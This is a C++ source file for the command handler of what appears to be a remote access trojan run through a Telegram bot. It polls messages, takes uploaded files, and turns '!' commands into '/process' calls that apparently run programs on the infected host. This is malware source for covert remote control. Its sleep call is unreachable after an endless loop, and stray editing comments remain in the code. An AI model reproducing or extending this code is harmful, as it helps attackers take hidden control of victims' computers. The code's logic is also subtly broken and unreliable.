#include "rat/system.hpp"
#include "rat/Handler.hpp"
#include <boost/algorithm/string.hpp>
#include <algorithm>
#include <chrono>
#include <cstdint>
#include <filesystem>
#include <optional>
#include "rat/networking.hpp"
#include <thread>
#include <atomic>

#include "rat/handler/debug.hpp"

namespace rat::handler {

// Keep this function static (it doesn't use member variables)
static inline bool _isUpdateEmpty(const rat::tbot::Update* p_Update) {
    return (p_Update->message.text.empty() && p_Update->message.files.empty());
}

// Change to member function, remove parameter
void Handler::_dynamicSleep() {
    constexpr uint32_t base_sleep_ms = 500;
    constexpr double   growth_factor = 1.001;
    constexpr uint32_t max_sleep_ms  = 5000;  // ← This is declared...

    double computed = base_sleep_ms * std::pow(growth_factor, static_cast<double>(this->empty_updates_count));

    // ...but not used here! Need to apply the max limit:
    if (computed > max_sleep_ms) {
        computed = max_sleep_ms;  // ← Apply the maximum limit
    }

    this->sleep_timeout_ms = computed;
}

void Handler::handleUpdates() {
    // Store the update properly to avoid dangling pointer
    std::optional<rat::tbot::Update> current_update;

    while (true) {
        {
            current_update = this->bot->getUpdate();  // Store in optional
            this->telegram_update = &current_update.value();  // Safe pointer

            if (_isUpdateEmpty(this->telegram_update)) {
                empty_updates_count++;
                HANDLER_DEBUG_LOG("Empty Update");
                this->_dynamicSleep();  // ← Call member function
                continue;
            }

            empty_updates_count = 0;  // Reset on successful update

            if (!this->telegram_update->message.files.empty()) {
                HANDLER_DEBUG_LOG("Handling uploaded files to the bot");
                this->handleMessageWithUploadedFiles();
                continue;
            }

            if (this->telegram_update->message.text.empty() ||
                (this->telegram_update->message.text[0] != '!' &&
                 this->telegram_update->message.text[0] != '/')) {
                this->bot->sendMessage("Empty Message, an integrated command starts with /, a dynamic one with ! ");
                continue;
            }

            if (this->telegram_update->message.text[0] == '!') {
                this->dispatchDynamicCommand();
            } else if (this->telegram_update->message.text[0] == '/') {
                this->dispatchIntegratedCommand();
            }
        }
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(this->sleep_timeout_ms));
}


void Handler::dispatchDynamicCommand() {
    std::string& command_text = this->telegram_update->message.text;

    if (!command_text.starts_with("!")) {
        return;
    }

    size_t first_space = command_text.find(' ');
    if (first_space == std::string::npos) {
        this->bot->sendMessage("Usage: !<command> <args...>");
        return;
    }

    std::string directive = command_text.substr(1, first_space - 1);
    std::string rest = command_text.substr(first_space + 1);
    boost::trim(rest);

    auto it = this->state.command_path_map.find(directive);
    if (it == this->state.command_path_map.end()) {
        this->bot->sendMessage(fmt::format("Unknown command: '{}'", directive));
        return;
    }

    const std::filesystem::path& real_path = it->path;

    std::string new_message;
    if (!rest.empty()) {
        new_message = fmt::format("/process {} {}", real_path.string(), rest);
    } else {
        new_message = fmt::format("/process {}", real_path.string());
    }

    this->telegram_update->message.text = new_message;
	this->parseTelegramMessageToCommand();
    this->handleProcessCommand();
}


void Handler::dispatchIntegratedCommand() {
    HANDLER_DEBUG_LOG("Dispatching commands based on the update {}", this->telegram_update->id);
    this->parseTelegramMessageToCommand();

    for (const auto& handler : command_map) {
        if (this->command.directive == handler.command) {
            (this->*handler.handler)();
            return;
        }
    }
    this->bot->sendMessage(fmt::format("Unknown command: {}", this->command.directive));
}

} // namespace rat::handler
#undef HANDLER_DEBUG_LOG
#undef HANDLER_ERROR_LOG
#ifdef DEBUG_RAT_HANDLER
    #undef DEBUG_RAT_HANDLER
#endif
